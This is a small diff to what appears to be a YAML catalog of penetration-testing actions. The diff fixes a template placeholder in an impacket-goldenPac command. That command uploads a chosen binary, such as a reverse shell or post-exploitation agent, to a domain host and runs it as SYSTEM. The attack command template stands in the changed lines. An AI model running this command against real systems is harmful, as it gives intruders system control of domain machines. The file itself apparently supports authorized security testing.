@@ -45,4 +45,4 @@ actions:
       Instead of launching the default cmd.exe, this command uploads a local executable to the target and runs it with system privileges. 
       This is useful for deploying custom reverse shells, post-exploitation agents, or specific enumeration tools. 
       Be cautious, as uploading files to the disk and creating services for execution is highly likely to be detected by EDR or antivirus solutions.
-    command: "impacket-goldenPac -c {{local_binary_path}} {{domain}}/{{username}}:{{password}}@{{target_fqdn}} {{binary_arguments|}}"
+    command: "impacket-goldenPac -c {{local_binary_path}} {{domain}}/{{username}}:{{password}}@{{target_fqdn}} {{binary_arguments}}"
